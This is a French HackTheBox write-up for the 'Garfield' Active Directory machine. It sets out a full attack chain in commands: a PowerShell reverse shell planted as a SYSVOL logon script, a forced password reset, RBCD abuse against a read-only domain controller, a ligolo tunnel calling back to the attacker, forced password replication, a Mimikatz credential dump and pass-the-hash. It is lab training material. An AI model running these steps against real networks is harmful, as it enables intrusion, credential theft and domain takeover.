🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# Garfield — HackTheBox Writeup

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a7ee5b5ec5cb4c2bf96545fda71ea8e6.png" width="120"/>
<div>

**Difficulté**: Hard  
**OS**: Windows  
**Type**: Active Directory  

</div>
</div>

---

## Résumé de la chaîne d'exploitation

```
j.arbuckle → Logon Script (SYSVOL) → l.wilson → ForceChangePassword → l.wilson_adm
→ RBCD sur RODC01 → wmiexec Administrator@RODC01 → repadmin rodcpwdrepl
→ Mimikatz dump → Hash NT Administrator → ROOT
```

---

## Énumération

### Scan Nmap

```bash
nmap -sV -sC 10.129.x.x -oN scan.txt
```

Ports ouverts : DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), WinRM (5985), RDP (3389).  
Machine : `DC01.garfield.htb` — Windows Server 2019.

### Credentials de départ

```
j.arbuckle / Th1sD4mnC4t!@1978
```

### Énumération LDAP et droits AD

```bash
ldapdomaindump -u 'garfield.htb\j.arbuckle' -p 'Th1sD4mnC4t!@1978' 10.129.x.x

bloodyAD -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.x.x get writable
```

`j.arbuckle` a des droits WRITE sur `CN=Liz Wilson` (`l.wilson`) et `CN=Liz Wilson ADM` (`l.wilson_adm`).

### Énumération SMB

```bash
nxc smb 10.129.x.x -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -M spider_plus
```

Dans le share NETLOGON, on trouve `printerDetect.bat` — un script exécuté lors du logon de `l.wilson`.

---

## Foothold — Shell via Logon Script

### Génération du reverse shell

```bash
grep -v '^#' /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w0 > /tmp/b64.txt
B64=$(cat /tmp/b64.txt)
echo "powershell -e $B64" > /tmp/printerDetect.bat
```

### Upload dans SYSVOL

```bash
smbclient //10.129.x.x/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
  -c 'cd garfield.htb\scripts; put /tmp/printerDetect.bat printerDetect.bat'
```

### Modification du scriptPath de l.wilson

```bash
bloodyAD -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.x.x \
  set object 'CN=Liz Wilson,CN=Users,DC=garfield,DC=htb' scriptPath -v 'printerDetect.bat'
```

### Listener

```bash
nc -lvnp 9001
```

On reçoit un shell en tant que `l.wilson`.

---

## User Flag

### Changement du mot de passe de l.wilson_adm

Depuis le shell `l.wilson` :

```powershell
$newpass = ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
```

### Connexion WinRM

```bash
evil-winrm -i 10.129.x.x -u 'l.wilson_adm' -p 'WhoKnows123!'
```

```powershell
type C:\Users\l.wilson_adm\Desktop\user.txt
```

---

## Privesc — RODC Attack

### Énumération des droits de l.wilson_adm

```bash
bloodyAD -u 'l.wilson_adm' -p 'WhoKnows123!' -d garfield.htb --host 10.129.x.x get writable
```

Droits WRITE sur `CN=RODC01`.

```bash
bloodyAD -u 'l.wilson_adm' -p 'WhoKnows123!' -d garfield.htb --host 10.129.x.x \
  get object 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb' \
  --attr msDS-KrbTgtLink,msDS-RevealOnDemandGroup,msDS-NeverRevealGroup,msDS-RevealedList
```

Informations clés :
- RODC utilise `krbtgt_8245` (rodcNumber: **8245**)
- Clé AES256 de krbtgt_8245 : `d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240`
- RODC01 est sur `192.168.100.2` (réseau interne)

### Ajout au groupe RODC Administrators

```bash
bloodyAD -u 'l.wilson_adm' -p 'WhoKnows123!' -d garfield.htb --host 10.129.x.x \
  add groupMember 'RODC Administrators' 'l.wilson_adm'
```

### Configuration RBCD (Resource-Based Constrained Delegation)

**Création d'un faux compte machine :**

```bash
addcomputer.py -computer-name 'FAKE$' -computer-pass 'FakePass123!' \
  -dc-ip 10.129.x.x 'garfield.htb/l.wilson_adm:WhoKnows123!'
```

**Configuration RBCD depuis evil-winrm :**

```powershell
Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKE$
```

### Modification de la politique de réplication RODC

On importe PowerView et modifie les attributs du RODC pour autoriser la réplication du mot de passe Administrator :

```powershell
Import-Module .\PowerView.ps1

Set-DomainObject -Identity RODC01$ -Set @{
  'msDS-RevealOnDemandGroup'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
  )
}

Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'
```

Ou via bloodyAD depuis Kali :

```bash
ldapmodify -x -H ldap://10.129.x.x -D 'l.wilson_adm@garfield.htb' -w 'WhoKnows123!' << 'EOF'
dn: CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
changetype: modify
add: msDS-RevealOnDemandGroup
msDS-RevealOnDemandGroup: CN=Administrator,CN=Users,DC=garfield,DC=htb
EOF
```

### Tunnel Ligolo vers le réseau interne

Le RODC est sur `192.168.100.2`, inaccessible directement. On monte un tunnel Ligolo.

**Kali :**
```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

**DC01 (evil-winrm) :**
```powershell
upload agent.exe
.\agent.exe -connect 10.10.x.x:11601 -ignore-cert
```

**CLI Ligolo :**
```
session
start
```

**Ajout de la route :**
```bash
sudo ip route add 192.168.100.0/24 dev ligolo
```

### Obtention d'un shell Administrator sur RODC01 via RBCD

```bash
sudo ntpdate 10.129.x.x
unset KRB5CCNAME
getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator \
  -dc-ip 10.129.x.x 'garfield.htb/FAKE$:FakePass123!'
export KRB5CCNAME='Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache'
wmiexec.py -k -no-pass -target-ip 192.168.100.2 garfield.htb/Administrator@RODC01.garfield.htb
```

### Forcer la réplication du mot de passe Administrator

Depuis le shell sur RODC01 :

```
repadmin /rodcpwdrepl RODC01 DC01 "CN=Administrator,CN=Users,DC=garfield,DC=htb"
```

Résultat attendu : `Successfully replicated secrets for user CN=Administrator...`

### Dump du hash Administrator avec Mimikatz

On copie mimikatz sur RODC01 (déjà présent dans `C:\Windows\Temp\` depuis une étape précédente) :

```
C:\Windows\Temp\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:Administrator" exit
```

Hash NT récupéré :
```
NTLM : ee238f6debc752010428f20875b092d5
```

---

## Root Flag

```bash
evil-winrm -i 10.129.x.x -u Administrator -H ee238f6debc752010428f20875b092d5
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Outils utilisés

- `nmap` — scan de ports
- `ldapdomaindump` — énumération LDAP
- `bloodyAD` — manipulation des objets AD
- `nxc` (NetExec) — énumération SMB
- `smbclient` — upload de fichiers sur SYSVOL
- `nishang` — reverse shell PowerShell
- `evil-winrm` — shell WinRM
- `PowerView` — manipulation des objets AD
- `impacket` (addcomputer, getST, wmiexec) — attaques Kerberos/RBCD
- `ligolo-ng` — tunnel vers le réseau interne
- `mimikatz` — dump de credentials
- `repadmin` — réplication RODC

---

## Notes

- La clé AES256 de `krbtgt_8245` (`d6c93cbe...`) est une donnée fixe de la box
- Le RODC (`192.168.100.2`) n'est accessible que via tunnel (Ligolo)
- La synchronisation NTP avec le DC est essentielle pour les attaques Kerberos (`sudo ntpdate <DC_IP>`)
- La box nécessite de modifier `msDS-NeverRevealGroup` et `msDS-RevealOnDemandGroup` sur RODC01 avant de pouvoir répliquer les credentials